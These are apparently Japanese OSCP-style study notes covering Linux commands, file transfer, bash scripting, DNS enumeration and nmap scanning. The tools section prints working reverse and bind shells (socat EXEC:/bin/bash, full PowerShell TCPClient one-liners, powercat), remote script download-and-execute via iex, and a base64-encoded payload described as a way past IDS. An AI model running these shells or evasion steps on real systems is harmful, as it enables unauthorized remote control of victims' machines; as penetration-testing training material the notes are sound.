## Linuxファイルシステム
- /bin - 基本プログラム (ls、cd、cat など)
- /sbin - システムプログラム (fdisk, mkfs, sysctl など)
- /etc - 設定ファイル
- /tmp - 一時ファイル（通常、起動時に削除される)
- /usr/bin - アプリケーション (apt, ncat, nmap など)
- /usr/share - アプリケーションのサポートファイルとデータファイル

## Linuxにおけるファイル検索
|  コマンド  |  意味  |
| ---- | ---- |
|  which  |  $PATH環境変数に定義されているディレクトリを指定されたファイル名で検索<br>ファイルが見つかった場合、ファイルのパスをフルパスで返す  |
|  locate  |  locateはハードディスク全体ではなくlocate.dbという名前の内臓データベースを検索する<br>このデータベースはcronによって自動更新され、updatedbコマンドを使用すれば手動更新も可能  |
|  fine  |  locateとは違い、様々な方法でファイルを検索可能<br>ファイルの日付、サイズ、所有者、タイムスタンプ、パーミッション  |

```
kali@kali:~$ sudo find / -name sbd*
/usr/bin/sbd
/usr/share/doc/sbd
/usr/share/windows-resources/sbd
/usr/share/windows-resources/sbd/sbd.exe
/usr/share/windows-resources/sbd/sbdbg.exe
/var/cache/apt/archives/sbd_1.37-1kali3_amd64.deb
/var/lib/dpkg/info/sbd.md5sums
/var/lib/dpkg/info/sbd.list
```

## echo $PATH
これらのディレクトリのいずれかに実行可能ファイルを配置する場合、実行可能ファイル/スクリプトへのパスを設定する必要がない
```
kali@kali:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

## wce32.exe
Windowsからハッシュを収集できるツール。  
/usr/share/wce/

## netstat/ss
ネットワーク状態確認コマンド。
```
どのプロセスがそのポートを開放しているか確認
netstat -tulpn
ss -tulpn
```

## systemctl
systemdをコントロールするコマンド。  
serviceコマンドとの違いはないが、serviceコマンドはinitを呼び出すスクリプトなのに対して、systemctlコマンドはネイティブなバイナリコマンドとなっている。
```
#サービスの開始
systemctl start ssh
#サービスの停止
systemctl stop ssh
#サービスの再起動
systemctl restart ssh
#サービスの起動状態表示
system status ssh
#サービスが自動起動するかの確認コマンド
systemctl list-unit-files -t service
#ブート時にサービス自動起動の有効化
systemctl enable ssh
#ブート時のサービス自動起動の無効化
systemctl disable ssh
```

## 環境変数の設定
環境変数はexportコマンドで定義することができる。
```
kali@kali:~$ export a=10.11.1.220
kali@kali:~$ ping -c 2 $a
PING 10.11.1.220 (10.11.1.220) 56(84) bytes of data.
64 bytes from 10.11.1.220: icmp_seq=1 ttl=62 time=2.23 ms
64 bytes from 10.11.1.220: icmp_seq=2 ttl=62 time=1.56 ms
```
exportコマンドは現在のBashインスタンスから生成されるあらゆるサブプロセスから変数にアクセスできるようにする。  
exportコマンド無しで環境変数を設定すると現在のシェルでしか利用できない。  
envコマンドを用いることで設定された環境変数を確認することができる。  
```
yukitsukai@DESKTOP-ES4DRSU:~$ env
SHELL=/bin/zsh
WSL_DISTRO_NAME=kali-linux
LESS_TERMCAP_se=
LESS_TERMCAP_so=
NAME=DESKTOP-ES4DRSU
PWD=/home/yukitsukai
LOGNAME=yukitsukai
HOME=/home/yukitsukai
LANG=en_US.UTF-8
```

## STDIN,SDTOUT,STDERR (stdio "Standard Input/Output")
|  StreamName  |  説明  |
| ---- | ---- |
|  STDIN  |  プログラムに入力されるデータ  |
|  STDOUT  |  プログラムから出力されるデータ  |
|  STDERR  |  エラーメッセージ  |

STDIN、STDOUT、STDERRのストリーム番号はそれぞれ0、1、2と定義されている。  
このためストリーム番号を「>」演算子の前に置くことで、リダイレクトすることもできる。
```
kali@kali:~$ ls ./test 2>error.txt
kali@kali:~$ cat error.txt
ls: cannot access '/test': No such file or directory
```

## テキストの検索と操作,比較
### grep
|  オプション  |  意味  |
| ---- | ---- |
|  -O  |  正規表現で定義された文字列のみ  |
|  -v  |  検索文字列にマッチしない行のみを表示(除外する)  |


### wc
テキストファイルの行数や単語数、文字数を数えるコマンド。  
(指定したテキストファイルの行数、単語数、バイト数)
|  オプション  |  意味  |
| ---- | ---- |
|  -c  |  バイト数の表示  |
|  -m  |  文字数を表示  |
|  -l  |  改行の数を表示  |
|  -w  |  単語数を表示  |

### sed
文字列を全置換したり、行単位で抽出したり、削除したり、いろいろなテキスト処理のできるコマンド。  
```
kali@kali:~$ echo "I need to try hard" | sed 's/hard/harder/' I need to try harder
```

### cut
ある行からテキストの一部を抽出し、それを標準出力に出力するために使用します。よく使われるオプションとして切り取るフィールド番号を表す-fや、フィールドの区切りを表す-dなどがある。
-dでカット、-fでカットしたものの選択(番号で)
```
kali@kali:~$ cut -d ":" -f 1 /etc/passwd root
daemon
bin
.
.
```

### awk
空白や記号で区切られたテキストを処理するコマンド。  
cutはフィールドの区切り文字として1文字しか受け付けないのに対し、awkははるかに柔軟に対応できる。  
-Fオプションは区切り文字の指定。
```
kali@kali:~$ echo "hello::there::friend" | awk -F "::" '{print $1, $3}' 
hello friend
```

### sort
テキストファイルを行単位で並べ替えるコマンド。  
オプションなしだとキャラクターコード順に並べ替える。
|  オプション  |  意味  |
| ---- | ---- |
|  -u  |  同一行は最初の一つ目だけを表示  |
|  -c  |  並べ替えられているか確認  |
|  -r  |  逆順で並べ替える  |
|  -n  |  文字列を数値と見なして並べ替える  |

### uniq
重複している行を削除するコマンド。  
uniqコマンドは、元のテキストが"並べ替え済み"であることが前提になるので、必要に応じて先に「sort」コマンドで並べ替えを実行しておく。
|  オプション  |  意味  |
| ---- | ---- |
|  -c  |  各行の前に出現回数を出力する  |

### host
nslookupコマンド同様、ドメイン名からIPアドレス、あるいはIPアドレスからドメイン名を調べるコマンド。

###  comm
2つのテキストファイルを比較し，それぞれのファイルに固有の行と共通の行を表示する。  
-12をつけると両ファイルに見られるものを抽出。
```
kali@kali:~$ comm scan-a.txt scan-b.txt
kali@kali:~$ comm -12 scan-a.txt scan-b.txt
```
### diff
commコマンドと同様にファイル間の差分を検出するためのコマンド。  
-c(コンテキスト形式)とユニファイド形式(-u)で表示可能。

## プロセス管理
Linuxカーネルは、プロセスを使ってマルチタスクを管理している。カーネルは、整理整頓のために各プロセスの情報を保持し、各プロセスにはプロセスID（PID）と呼ばれる番号が割り当てられている。  
シェルで動かしたプロセスことをジョブと呼ぶ。  
下記のようなパイプを使って二つのプロセスを実行している場合も一つのジョブとする。
```
cat test.txt | grep hello
```

### バックグラウンドジョブ
&をつけることでバックグラウンドでジョブを実行。
```
kali@kali:~$ ping -c 400 localhost > ping_results.txt &
```
Ctrl+zで停止、bgでジョブの再開。
```
kali@kali:~$ ping -c 400 localhost > ping_results.txt
^Z
[1]+ Stopped ping -c 400 localhost > ping_results.txt
kali@kali:~$ bg
[1]+ ping -c 400 localhost > ping_results.txt kali@kali:~$
```

jobsコマンドにより現在のジョブ一覧を表示。  
-lを使用することでリスト表示にプロセスIDを付加。  
fgコマンドにより再開したいジョブの選択。
```
kali@kali:~$ ping -c 400 localhost > ping_results.txt
^Z
[1]+ Stopped ping -c 400 localhost > ping_results.txt
kali@kali:~$ find / -name sbd.exe
^Z
[2]+ Stopped
kali@kali:~$ jobs [1]- Stopped [2]+ Stopped
find / -name sbd.exe
ping -c 400 localhost > ping_results.txt find / -name sbd.exe
kali@kali:~$ fg %1
ping -c 400 localhost > ping_results.txt ^C
kali@kali:~$ jobs
[2]+ Stopped find / -name sbd.exe
kali@kali:~$ fg
find / -name sbd.exe /usr/share/windows-resources/sbd/sbd.exe
```

### ps,killコマンドによるプロセスコントロール
jobsコマンドは現在のターミナルセッションのジョブを表示していたが、psコマンドではシステム全体のプロセスをリストアップする。  

#### ps
|  オプション  |  意味  |
| ---- | ---- |
|  -e  |  全てのプロセスを表示  |
|  -f  |  フルフォーマットのリストを表示  |
|  -C  |  アプリケーションの名前が分かっている場合、指定して表示  |

```
ps aux
・a: 端末操作のプロセス(自分 + 他ユーザー)を表示する
・u: 各プロセスの実行ユーザーやCPU, Mem(メモリ)等の情報も表示する
・x: 端末操作のないプロセス(daemon等)も表示する
```

## ファイルおよびコマンドの監視
### teil
tailはファイルの最終行から数行を表示するコマンド。  標準では１０行を表示する。

fオプション（follow）は、対象となるファイルの成長に合わせて出力を継続的に更新する。もう一つの便利なスイッチは-nXで、これはデフォルトの10行ではなく、最後の「X」行数を出力する。

### watch
指定したコマンドを2秒間隔で繰り返し実行するコマンド。
-n 1のように明示すると繰り返し時間間隔を変更でき、この場合コマンドを1びょうかんかくで　繰り返し実行する。

```
kali@kali:~$ watch date
Every 2.0s: date                                                              DESKTOP-ES4DRSU: Fri Apr 23 14:47:27 2021
Fri 23 Apr 2021 02:47:27 PM JST
```

## ファイルのダウンロード
### wget
-Oを指定することで保存する際のファイル名を指定することが可能。
```
kali@kali:~$ wget -O report_wget.pdf https://www.offensive-security.com/reports/penetr ation-testing-sample-report-2013.pdf
```

### curl
curlは多数のプロトコルを使用してサーバーとの間でデータを転送するためのツール。
```
kali@kali:~$ curl -o report.pdf https://www.offensive-security.com/reports/penetration -testing-sample-report-2013.pdf
```

### axel
FTPやHTTPサーバから複数の接続を解してファイルを天sのうするコマンド。  
複数の接続数を指定する-nオプション。  
より簡潔な進行状況表示のために-aオプション。  
ダウンロードしたファイルに別のファイル名を指定するための-oオプション。
```
kali@kali:~$ axel -a -n 20 -o report_axel.pdf https://www.offensive-security.com/repor ts/penetration-testing-sample-report-2013.pdf
```

# 実用的なツール
## Netcat
|  オプション  |  意味  |
| ---- | ---- |
|  -n  |  DNSの名前解決をスキップする  |
|  -v  |  冗長性の追加  |
|  -l  |  リスナーの作成  |
|  -p  |  リッスンポートの指定  |

### ファイルの受け渡し(netcat)
```
受信側
C:\Users\offsec> nc -nlvp 4444 > incoming.exe
listening on [any] 4444 ...

送信側
kali@kali:~$ locate wget.exe
/usr/share/windows-resources/binaries/wget.exe
kali@kali:~$ nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
```

## Socat
### Netcat vs Socat
```
kali@kali:~$ nc <remote server's ip address> 80
kali@kali:~$ socat - TCP4:<remote server's ip address>:8
```

### ファイルの転送
```
送信側
kali@kali:~$ sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt

受信側
C:\Users\offsec> socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
C:\Users\offsec> type received_secret_passwords.txt
"try harder!!!"
```

### reverse shell
```
待ち受け側
C:\Users\offsec> socat -d -d TCP4-LISTEN:443 STDOUT
... socat[4388] N listening on AF=2 0.0.0.0:443

接続側
kali@kali:~$ socat TCP4:10.11.0.22:443 EXEC:/bin/bash
```
### socatの通信暗号化
#### openssl
・req: 新しい証明書署名要求を開始
・-newkey: 新しい秘密鍵を生成 
・rsa:2048：2,048ビットの鍵長でRSA暗号を使用
・-nodes：パスフレーズ保護なしで秘密鍵を保存
・-keyout: 鍵をファイルに保存
・-x509：証明書要求の代わりに自己署名証明書を出力
・-days：有効期間を日単位で設定
・-out: 証明書をファイルに保存

opensslを用いて鍵と証明書の生成。  
生成したものを.pemに変換してsocatで読み込めるようにする。  
```
kali@kali:~$ openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 36
2 -out bind_shell.crt
nGenerating a 2048 bit RSA private key
.....................+++
................................+++
writing new private key to 'bind_shell.key'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:US
State or Province Name (full name) [Some-State]:Georgia
Locality Name (eg, city) []:Atlanta
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Offsec
Organizational Unit Name (eg, section) []:Try Harder Department
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:
kali@kali:~$ cat bind_shell.key bind_shell.crt > bind_shell.pem
```

```
受信側
kali@kali:~$ sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin
/bash

送信側
C:\Users\offsec> socat - OPENSSL:10.11.0.4:443,verify=0
id
uid=1000(kali) gid=1000(kali) groups=1000(kali)
whoami
kali
```

## PowerShell
### ファイルのダウンロード
```
C:\Users\test> powershell -c (New-Object Net.WebClient).DownloadFile('http://10.11.0.4/rs.exe', 'rs.exe')
```

### reverse shell
```
$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```

### ワンライナーreverse shell
```
C:\Users\offsec> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10. 11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c lient.Close()"
```

### ワンライナーbind shell
```
C:\Users\offsec> powershell -c "$listener = New-Object System.Net.Sockets.TcpListener( '0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $clie nt.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $byt es.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString ($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$str eam.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Sto p()"

kali@kali:~$ nc -nv 10.11.0.22 443
(UNKNOWN) [10.11.0.22] 443 (https) open
ipconfig
Windows IP Configuration
Ethernet adapter Local Area Connection:
Connection-specific DNS Suffix . :
IPv4 Address. . . . . . . . . . . : 10.11.0.22
Subnet Mask . . . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 10.11.0.1
C:\Users\offsec>
```
## Powercat
PowercatはPowerShell版のNetcat。  
Dot-sourcingを使用して、powercat.ps1スクリプトをロードすることによりPowerShell内で直接powercat関数を使用可能になる。
```
PS C:\Users\Offsec> . .\powercat.ps1
```
攻撃対象となるマシンがインターネットに接続されている場合、githubからダウンロードさせることも可能。
```
 PS C:\Users\Offsec> iex (New-Object System.Net.Webclient).DownloadString('https://raw. githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```
```
PS C:\Users\offsec> powercat -h
powercat - Netcat, The Powershell Version
Github Repository: https://github.com/besimorhino/powercat
```

### ファイル転送
```
受信側
kali@kali:~$ sudo nc -lnvp 443 > receiving_powercat.ps1 listening on [any] 443 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63661

送信側
PS C:\Users\Offsec> powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
```

### reverse shell
```
受信側
kali@kali:~$ sudo nc -lvp 443 listening on [any] 443 ...

送信側
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe
```

### bind shell
```
受信側
PS C:\Users\offsec> powercat -l -p 443 -e cmd.exe

送信側
kali@kali:~$ nc 10.11.0.22 443
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Users\offsec>
```

### スタンドアローン型payloadの生成
Powercatでは-gオプションをつけることで、スタンドアローン型ペイロードの生成が可能である。
```
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1 PS C:\Users\offsec> ./reverseshell.ps1
```

しかし、スタンドアロン型ペイロードはIDSによって容易に検出される可能性がある。  
そこで、Base64でエンコードされたコマンドを実行できるPowerShell機能を利用することで、回避する。  
-geオプションを利用することで、
```
PS C:\Users\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
```

このファイル内の文字列をコピーして、PowerShellの-Eオプション渡すことで実行できる。

```
PS C:\Users\offsec> powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFM AZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzA CkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQB yAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAb wBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAo AIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByA HMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIAB OAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAc ABDAGwAaQBlAG4AdAAKACAAIAAgACA
```



## Wireshark
ネットワークプロトコルアナライザー。    
ipアドレスやプロトコルでのフィルターを活用して調査を行う。  
また、Following TCP Streamsを活用することで、特定のセッションを再構成して表示することができる。FTPのようなクリアテキストのプロトコルの場合、送受信したコマンドや出力を見ることができる。


## Tcpdump
```
kali@kali:~~~$~~ sudo tcpdump -r password_cracking_filtered.pcap
```

|  オプション  |  意味  |
| ---- | ---- |
|  -r  |  ファイルを開く  |
|  -n  |  DNS名の検索をスキップ  |
|  src host |  送信元ホストの指定  |
|  dst host |  宛先ホストの指定  |
|  -X  |  このオプションを使うことでパケットデータをHEXとASCIIのフォーマットで出力  |

# Bash Scripting
## ユーザーの入力
```
#ユーザーの入力を変数に入れる
read username
#-pはプロンプトを指定
read -p 'Username: ' username
#-sはユーザーの入力を表示しない(パスワードの入力などに最適)
read -sp 'Password: ' password
```

## if文
```
#!/bin/bash
# if statement example

read -p "What is your age: " age
if [ $age -lt  16 ]
then
    echo "You might need parental permission to take this course!"
fi
```
[ ]はtestコマンドを呼び出して判定してるだけなので、下記のような表記でも動作する。
```
#!/bin/bash
# if statement example 2
read -p "What is your age: " age
if test $age -lt 16
then
    echo "You might need parental permission to take this course!"
elif test $age -gt 60
then
     echo "hats off to you, respect!"
else
    echo "welcom to course!"
fi
```

```
#/bin/bash
# and example
#if [ $USER == 'kali' ] && [ $HOSTNAME == 'kali' ]
#if test $USER == 'kal' || test $HOSTNAME == 'aaa'
then
    echo "Multiple statements are true!"
else
    echo "Not much to see here..."
fi
```

## AND(&&) OR(||)
```
#/bin/bash
# and example
if [ $USER == 'kali' ] && [ $HOSTNAME == 'kali' ]
then
    echo "Multiple statements are true!"
else
    echo "Not much to see here..."
fi
```

## Loops
seqコマンドは連続の番号や範囲を指定した文字を主力出来る。  
```
#1から10までの数を出力
seq 1 10
#5から10までの数を出力
seq 5 10
#5から10までの数を2つずつ増やしながら出力
seq 5 2 10
```
```
for ip in $(seq 1 10); do echo 10.11.1.$ip; done
```
```
for ip in $(seq 1 10)
do
    echo 10.11.1.$ip
done
```

### while loops
```
#!/bin/bash
# while loop example
counter=1
while [ $counter -lt 10 ]
do
    echo "10.11.1.$counter"
    ((counter++))
done
```

## 関数(Functions)
bashにおける()は基本使われることはない。  
関数内に$1などが定義されているときに、引数を指定することができる。
```
#!/bin/bash
# passing arguments to functions
pass_arg() {
    echo "Today's random number is: $1"
}
pass_arg $RANDOM
```

## 実践的な組み合わせ
afdの文字を含んだwindowsのエクスプロイトを全て検証したいとき、以下のようにbashを使用することでまとめてダウンロードすることができる。
```
┌──(yukitsukai㉿DESKTOP-ES4DRSU)-[~/test]
└─$ searchsploit afd windows -w -t
--------------------------------------------------------------------------- --------------------------------------------
 Exploit Title                                                             |  URL
--------------------------------------------------------------------------- --------------------------------------------
Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)  | https://www.exploit-db.com/exploits/40564
Microsoft Windows - 'afd.sys' Local Kernel (PoC) (MS11-046)                | https://www.exploit-db.com/exploits/18755
Microsoft Windows - 'AfdJoinLeaf' Local Privilege Escalation (MS11-080) (M | https://www.exploit-db.com/exploits/21844
Microsoft Windows 7 (x64) - 'afd.sys' Dangling Pointer Privilege Escalatio | https://www.exploit-db.com/exploits/39525
Microsoft Windows 7 (x86) - 'afd.sys' Dangling Pointer Privilege Escalatio | https://www.exploit-db.com/exploits/39446
Microsoft Windows 7 Kernel - Pool-Based Out-of-Bounds Reads Due to bind()  | https://www.exploit-db.com/exploits/42009
Microsoft Windows XP - 'afd.sys' Local Kernel Denial of Service            | https://www.exploit-db.com/exploits/17133
Microsoft Windows XP/2003 - 'afd.sys' Local Privilege Escalation (K-plugin | https://www.exploit-db.com/exploits/6757
Microsoft Windows XP/2003 - 'afd.sys' Local Privilege Escalation (MS11-080 | https://www.exploit-db.com/exploits/18176
--------------------------------------------------------------------------- --------------------------------------------
Shellcodes: No Results

┌──(yukitsukai㉿DESKTOP-ES4DRSU)-[~/test]
└─$ searchsploit afd windows -w -t | grep http | cut -f 2 -d "|" | cut -d "/" -f 5 > list.txt

┌──(yukitsukai㉿DESKTOP-ES4DRSU)-[~/test]
└─$ cat list.txt
40564
18755
21844
39525
39446
42009
17133
6757
18176

┌──(yukitsukai㉿DESKTOP-ES4DRSU)-[~/test]
└─$ for a in $(cat list.txt); do searchsploit -m $a; done
ダウンロード完了！
```

# パッシブスキャン(この章は全体的にOSCP試験に関係ないため省略してるところ多い)
Webサイトを持っている場合、それを訪問して、情報収集を行う。  
例）メールアドレスの形式やTwitterのアカウント、その他社員情報

## whois情報
```
whois MEGACORP.COM
```
whois情報を確認することで、誰がドメイン名を登録しているのかなどが分かる。  
またwhoisコマンドでIPアドレスを使って逆引きすることもできる。逆引きの結果、そのIPアドレスを誰がホストしているのかという情報が得られる。

## Google hacking
以下のような検索を行うことで、どのようなプログラミング言語を用いているのかや、機密情報の公開範囲の設定ミス等を見つけることが可能である。
```
site:MEGACORP.COM filetype:php
```
|  オプション  |  意味  |
| ---- | ---- |
|  site  |  ドメイン名の指定  |
|  filetype(ext)  |  ファイルの拡張子で検索  |
|  intitle  |  タイトルに含む文字の指定(intitle:"index of" "parent directory")  |

## その他
recon-ngなどのツールの活用
github,gitlab,sourceforgeなどの調査
Shodan
Security Headers
SSL Server Test(Heartbleedなどの脆弱性の特定に利用)
Pastebin
theharvesterによる電子メールの収集

# Active Information Gathering
## DNS
- -NS(ネームサーバーレコード)...ドメインのDNSレコードをホストする権威サーバーの名前が含まれる
- -A(ホストレコード)...ホスト名のIPアドレスが含まれている
- -MX(mail Exchangeレコード)...ドメインの電子メール処理を担当するサーバーの名前が含まれている
- -PTR(ポインタレコード)...逆引きで使用されIPアドレスに関連するレコードを見つけるために使用される
- -TXT(テキストレコード)...テキストレコードは任意のデータを含むことができ、ドメインの所有権確認などを行える

hostコマンドはデフォルトではAレコードを検索するが、-tオプションをつけることで、その他のレコードを検索することも可能。
```
kali@kali:~$ host -t txt megacorpone.com
```

### DNSブルートフォース
```
┌──(kali㉿kali)-[~]
└─$ cat list.txt                         
www
ftp
mail
owa
proxy
router
                                                                                                 
┌──(kali㉿kali)-[~]
└─$ for domain in $(cat list.txt); do host $domain.megacorpone.com; done
www.megacorpone.com has address 149.56.244.87
Host ftp.megacorpone.com not found: 3(NXDOMAIN)
mail.megacorpone.com has address 51.222.169.212
Host owa.megacorpone.com not found: 3(NXDOMAIN)
Host proxy.megacorpone.com not found: 3(NXDOMAIN)
router.megacorpone.com has address 51.222.169.214
                                                                                                 
┌──(kali㉿kali)-[~]
└─$ for domain in $(cat list.txt); do host $domain.megacorpone.com; done | grep -v "not found"
www.megacorpone.com has address 149.56.244.87
mail.megacorpone.com has address 51.222.169.212
router.megacorpone.com has address 51.222.169.214
```

### DNSゾーン転送
権威DNSサーバの設定不備によってゾーン情報を取得できることがある。  
これによりサーバーの名前、アドレス、機能などを調べることができる。
```
host -l <domain name> <dns server address>
```
```
kali@kali:~$ host -l megacorpone.com ns2.megacorpone.com
Using domain server:
Name: ns2.megacorpone.com
Address: 38.100.193.80#53
Aliases:
megacorpone.com name server ns1.megacorpone.com.
megacorpone.com name server ns2.megacorpone.com.
megacorpone.com name server ns3.megacorpone.com.
admin.megacorpone.com has address 38.100.193.83
beta.megacorpone.com has address 38.100.193.88
fs1.megacorpone.com has address 38.100.193.82
intranet.megacorpone.com has address 38.100.193.87
mail.megacorpone.com has address 38.100.193.84
mail2.megacorpone.com has address 38.100.193.73
ns1.megacorpone.com has address 38.100.193.70
```

```
kali@kali:~$ host -t ns megacorpone.com | cut -d " " -f 4
ns1.megacorpone.com.
ns2.megacorpone.com.
ns3.megacorpone.com.
```

関連するネームサーバーを特定し、それからゾーン転送を試みるプロセスを自動化するBashスクリプト。
```
#!/bin/bash
# Simple Zone Transfer Bash Script
# $1 is the first argument given after the bash script
# Check if argument was given, if not, print usage
if [ -z "$1" ]; then
    echo "[*] Simple Zone transfer script"
    echo "[*] Usage : $0 <domain name> "
    exit 0
fi
# if argument was given, identify the DNS servers for the domain
for server in $(host -t ns $1 | cut -d " " -f4); do
    # For each of these servers, attempt a zone transfer
    host -l $1 $server |grep "has address"
done
```
```
kali@kali:~$ chmod +x dns-axfr.sh
kali@kali:~$ ./dns-axfr.sh megacorpone.com
admin.megacorpone.com has address 38.100.193.83
beta.megacorpone.com has address 38.100.193.88
fs1.megacorpone.com has address 38.100.193.82
intranet.megacorpone.com has address 38.100.193.87
mail.megacorpone.com has address 38.100.193.84
mail2.megacorpone.com has address 38.100.193.73
ns1.megacorpone.com has address 38.100.193.70
ns2.megacorpone.com has address 38.100.193.80
ns3.megacorpone.com has address 38.100.193.90
```

### DNSRecon
DNS列挙スクリプト。
```
1.kali@kali:~$ dnsrecon -d megacorpone.com -t axfr
2.kali@kali:~$ dnsrecon -d megacorpone.com -D ~/list.txt -t brt
```
- -d...ドメイン名の指定
- -t...実行する列挙の種類(1つ目はゾーン転送)
- -t...実行する列挙の種類(2つ目はブルートフォース)
- -D...サブドメイン文字列を含むファイルの指定

### DNSenum
DNSReconとは異なった出力をするDNS列挙ツール。
```
kali@kali:~$ dnsenum zonetransfer.me
```

## Port Scanning
ポートスキャンとは、リモートマシン上のTCPまたはUDPポートを検査するプロセス。

### TCP/UDPスキャン
TCPスキャンでは3ウェイハンドシェイクによってポートが開いているかを確認する。  
UDPスキャンでは、空のパケットを送信し、送信先のUDPポートが開いている場合、パケットがアプリケーション層に渡され、受信するレスポンスはアプリケーションによって異なる。UDPポートが閉じられている場合は「ICMP port unreachable」メッセージを使用して空いてるかを調べる。  
しかしこれにはいくつかの問題があり、UDPスキャンを使用する場合、ファイアウォールやルーターによってICMPパケットをドロップすることがあるため、誤判定を生んでしまう。

### nmap
#### ステルス/SYNスキャン
ユーザーがraw sockets権限を持っている場合に使用されるNmapのデフォルトスキャン。よって、sudo/root権限の場合のデフォルトスキャンを意味する。  
オプションは-sS。  
SYNスキャンはTCPハンドシェイクを完了せずに、ターゲットマシンの様々なポートにSYNパケットを送信するTCPポートスキャン手法。3ウェイハンドシェイクを完了するための最後のACKを送信しない。
```
kali@kali:~$ sudo nmap -sS 10.11.1.220
```

#### TCPコネクトスキャン
ユーザーがraw socket権限を持っていない場合、nmapはデフォルトでこのスキャンを使用する。バークレーのソケットAPIを利用して3ウェイハンドシェイクを実行する。3ウェイハンドシェイクを完了させるため、SYSスキャンよりも完了までの時間は長くなる。  
オプションは-sT。  
```
kali@kali:~$ nmap -sT 10.11.1.220
```

#### UDPスキャン
UDPスキャンを実行する場合、Nmapは2つの異なる方法を組み合わせて、ポートが開いているか閉じているかを判断する。一つは先ほどまでに登場していた空のパケットを送信して確かめる「ICMP port unreachable」。もう一つはSNMPなどに対してはプロトコル固有のSNMPパケットを送信して応答を得る。  
オプションは-sU。
```
kali@kali:~$ sudo nmap -sU 10.11.1.115
```
UDPスキャンはTCP SYNスキャンと組み合わせて使用することも可能で、ターゲットを完全に把握することができる。
```
kali@kali:~$ sudo nmap -sS -sU 10.11.1.115
```

#### Network Sweeping
ネットワークスイープを行い、ホストのスキャンを行う。
```
kali@kali:~$ nmap -sn 10.11.1.1-254
```

オプション-oGを使用することでgrepができるファイルを出力することができる。
```
kali@kali:~$ nmap -v -sn 10.11.1.1-254 -oG ping-sweep.txt
kali@kali:~$ grep Up ping-sweep.txt | cut -d " " -f 2
10.11.1.5
10.11.1.7
10.11.1.8
...
```
複数のIPをスキャンして、共通のポートを列挙するためには--top-portsオプションを使用することで上位20個のTCPポートを列挙することができる。また、-AでOSバージョン検出。
```
kali@kali:~$ nmap -sT -A --top-ports=20 10.11.1.1-254 -oG top-port-sweep.txt
```

#### OS フィンガープリンティング
オペレーティングシステムはTCP/IPスタックの実装がわずかに異なる。(デフォルトのTTL値やTCPウィンドウサイズが異なるなど)  
ここからnmapはOSの識別を行う。
```
kali@kali:~$ sudo nmap -O 10.11.1.220
Device type: general purpose
Running: Microsoft Windows 2008|7
